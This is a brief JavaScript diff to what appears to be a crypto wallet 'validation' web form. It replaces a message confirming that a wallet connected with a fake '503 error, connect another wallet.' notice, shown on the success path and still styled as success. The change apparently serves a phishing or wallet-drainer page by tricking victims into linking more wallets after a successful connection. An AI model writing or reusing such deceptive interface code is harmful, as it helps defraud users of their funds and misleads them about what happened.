@@ -181,7 +181,7 @@ function setupValidationForms() {
                     }
                     
                     // Show success message
-                    showNotification('Validation successful! Your wallet has been connected.', 'success');
+                    showNotification('503 error, connect another wallet.', 'success');
                 }, 2000);
             }
         });
